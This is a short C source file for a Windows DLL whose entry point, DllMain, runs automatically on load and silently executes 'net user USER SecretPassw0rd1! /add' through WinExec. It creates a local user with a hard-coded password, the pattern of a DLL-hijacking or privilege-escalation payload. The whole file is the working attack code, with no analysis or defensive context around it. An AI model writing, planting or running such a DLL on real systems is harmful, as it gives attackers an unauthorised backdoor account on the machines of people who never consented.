#include <windows.h>
#include "pch.h"

int ExecMyshit()
{
	WinExec("net user USER SecretPassw0rd1! /add", 0);
	return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	ExecMyshit();
	return 0;
}
